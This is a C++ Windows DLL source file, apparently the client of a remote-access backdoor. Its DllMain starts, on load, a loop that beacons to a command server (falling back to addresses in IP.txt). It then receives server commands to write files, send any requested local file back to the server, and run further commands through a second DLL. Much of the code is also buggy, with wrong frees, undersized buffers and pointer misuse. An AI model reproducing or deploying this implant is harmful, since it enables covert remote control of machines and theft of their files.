// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#define DEBUG
SAVEFILE* GetFileInfo(INFOFILE *FileInfo) {
    SAVEFILE* SaveFile = (SAVEFILE*)malloc(sizeof(SAVEFILE)+strlen(FileInfo->Name));
    strcpy(SaveFile->Name, FileInfo->Name);
    SaveFile->ClientSUMSize = 0;
    SaveFile->SizeSUM = 0;
    SaveFile->fp = fopen(SaveFile->Name, "wb");
    return SaveFile;
}
BOOL SendInfo(SOCKET TCP_Client, SendServerInfo *SendInfoStructure,const char *SendInfo,const char *Type,const char *Command) {
    if (SendInfoStructure->Info != nullptr) free(SendInfoStructure);
    signed long int Let = strlen(SendInfo);
    SendInfoStructure->Info = (char*)malloc(sizeof(char) * Let);
    strcpy(SendInfoStructure->Info, SendInfo);
    strcpy(SendInfoStructure->Type, Type);
    strcpy(SendInfoStructure->Command, Command);
    if (send(TCP_Client, (char*)&SendInfoStructure, sizeof(char) * Let + sizeof(SendServerInfo), 0) == SOCKET_ERROR) {
        free(SendInfoStructure->Info);
        return FALSE;
    }
    free(SendInfoStructure->Info);
    return TRUE;
}
short int RecvFile(SAVEFILE* SaveFile, CLIENTFILE* ClientFile) {
    if (SaveFile == nullptr) return 0;
    SaveFile->ClientSUMSize += ClientFile->Size;
    fwrite(ClientFile->Note, sizeof(char), ClientFile->Size, SaveFile->fp);
    if (SaveFile->ClientSUMSize == SaveFile->SizeSUM) {
        fclose(SaveFile->fp);
        free(SaveFile);
        return 2;
    }
    return 1;
}
short int SendFile(SOCKET TCP_Client, SendServerInfo SendInfoStructure,char *FilePath) {
    // FILE info
    FILE* fp = fopen(FilePath, "r+");
    if (fp == nullptr) {
        return 0;
    }
    INFOFILE FileInfo;
    fseek(fp, 0, SEEK_END);
    signed long int FileSize = ftell(fp);// 文件指针偏移量(单位:字节)
    rewind(fp);
    FileInfo.Size = FileSize;
    char* p;
    strcpy(FileInfo.Name, (p = strrchr(FilePath, '\\')) ? p + 1 : FilePath);
    if (!SendInfo(TCP_Client, &SendInfoStructure, (char*)&FileInfo, "FileInfo", "")) return FALSE;
    // SendFile
    char RecvInfo[sizeof(GetServerInfo) + DATA_BUFMAX] = { 0 };
    while (!feof(fp)) {
        if (recv(TCP_Client, RecvInfo, sizeof(RecvInfo), 0) == SOCKET_ERROR) return FALSE;
        GetServerInfo* GetSystemInfo = (GetServerInfo*)&RecvInfo;// 解析
        if ((int)&GetSystemInfo->Info == 1) {
            CLIENTFILE* SendFile = (CLIENTFILE*)malloc(sizeof(int) + sizeof(char) * DATA_BUFMAX);
            SendFile->Size = fread(SendInfoStructure.Info, sizeof(char), DATA_BUFMAX, fp);
            if (!SendInfo(TCP_Client, &SendInfoStructure, (char*)&SendFile, "RecvFile", "")) {
                free(SendFile);
                return 1;
            }
            free(SendFile);
        }
        else {
            fclose(fp);
            return 1;
        }
    }
    return 2;
}
int ClientDLL() {
    // 加载函数
    HMODULE hModule = LoadLibrary(TEXT("A:\\Project\\c\\DLL\\D_API\\x64\\Release\\D_API.dll")); 
    typedef vector<char*>*(*ParseCommand_Function)(char* Type, char* Command, char* Parametric);
    typedef BOOL(*FreeVectorArray_Function)();
    ParseCommand_Function ParseCommand = (ParseCommand_Function)GetProcAddress(hModule, "ParseCommand");
    FreeVectorArray_Function FreeVectorArray = (FreeVectorArray_Function)GetProcAddress(hModule, "FreeVectorArray");
    // start
    while (1) {
        WSAData wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 0;
        SOCKET TCP_Client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (TCP_Client == INVALID_SOCKET) return 0;

        sockaddr_in addrServ;
        addrServ.sin_family = AF_INET;
        addrServ.sin_port = htons(IP_PORT);
        addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
        FILE* ClientIP_FILE = fopen("IP.txt", "r");
        while ((connect(TCP_Client, (LPSOCKADDR)&addrServ, sizeof(addrServ))) == SOCKET_ERROR) {
            if (ClientIP_FILE != NULL) {
                char IP[50] = { 0 };
                if (fgets(IP, 50, ClientIP_FILE) == NULL) {
                    fseek(ClientIP_FILE, 0, SEEK_SET);
                    addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
                    continue;
                }
                addrServ.sin_addr.S_un.S_addr = inet_addr(IP);
            }
#ifndef DEBUG
            Sleep(240000);// 4min
#else
            Sleep(5000);// 5s
#endif
        }
        if (ClientIP_FILE != nullptr) {
            fclose(ClientIP_FILE);
            free(ClientIP_FILE);
        }

        char RecvInfo[sizeof(GetServerInfo) + DATA_BUFMAX] = { 0 };
        SendServerInfo SendInfoStructure;
        vector<char*>* SendInfoArray;
        SAVEFILE *SaveFile;
        while (1) {
            if (recv(TCP_Client, RecvInfo, sizeof(RecvInfo), 0) == SOCKET_ERROR) {
                goto NewStart;
            }
            GetServerInfo* GetSystemInfo = (GetServerInfo*)&RecvInfo;// 解析
            // 填写信息
            strcpy(SendInfoStructure.Type, "I");
            strcpy(SendInfoStructure.ID.Name, GetSystemInfo->ID.Name);
            SendInfoStructure.ID.Num = GetSystemInfo->ID.Num;
            // 判断内容
            if (!strcmp(GetSystemInfo->Type, "C") && !strcmp(GetSystemInfo->Info, "Exit")) {
                break;
            }
            else if (!strcmp(GetSystemInfo->Type, "F")) {
                if (!strcmp(GetSystemInfo->Command, "FileInfo")) {
                    SaveFile = GetFileInfo((INFOFILE*)GetSystemInfo->Info);
                    if (!SendInfo(TCP_Client, &SendInfoStructure, (char*)1,"I","")) goto NewStart;
                }
                else if (!strcmp(GetSystemInfo->Command,"RecvFile")) {
                    short int BUFF = RecvFile(SaveFile, (CLIENTFILE*)GetSystemInfo->Info);
                    if (BUFF == 1) {// 继续
                        if (!SendInfo(TCP_Client, &SendInfoStructure, (char*)1,"I","")) goto NewStart;
                    }
                    else if (BUFF == 2) {// 完成
                        if (!SendInfo(TCP_Client, &SendInfoStructure, "文件接收完毕", "I", "")) goto NewStart;
                    }
                    else {// 接收失败
                        if (!SendInfo(TCP_Client, &SendInfoStructure, (char*)0,"I","")) goto NewStart;
                        if (!SendInfo(TCP_Client, &SendInfoStructure, "文件接收失败", "I", "")) goto NewStart;
                    }
                }
                else if (!strcmp(GetSystemInfo->Command, "SendFile")) {
                    short int BUFF = SendFile(TCP_Client, SendInfoStructure, GetSystemInfo->Info);
                    if (BUFF == 0) {
                        SendInfo(TCP_Client, &SendInfoStructure, "打开文件失败,取消发送", "I", "");
                    }
                    else if (BUFF == 1) {
                        SendInfo(TCP_Client, &SendInfoStructure, "发送失败,取消发送", "I", "");
                    }
                    else {
                        SendInfo(TCP_Client, &SendInfoStructure, "发送完成", "I", "");
                    }
                }
                else {
                    if (!SendInfo(TCP_Client, &SendInfoStructure, "查询不到对应指令", "I", "")) goto NewStart;
                }
                continue;
            }
            // 处理
            if (ParseCommand == NULL || FreeVectorArray == NULL) {
                if (!SendInfo(TCP_Client, &SendInfoStructure, "查找不到DLL函数", "I", "")) goto NewStart;
            }
            else {
                SendInfoArray = ParseCommand(GetSystemInfo->Type, GetSystemInfo->Command, GetSystemInfo->Info);
                for (int i = 0; i < SendInfoArray->size(); i++) {
                    if (!SendInfo(TCP_Client, &SendInfoStructure, (char*)SendInfoArray->at(i), "I", "")) {
                        FreeVectorArray();
                        goto NewStart;
                    }
                }
                FreeVectorArray();
            }
        }
    NewStart:// 初始化环境
        closesocket(TCP_Client);
        WSACleanup();
    }
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ClientDLL();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

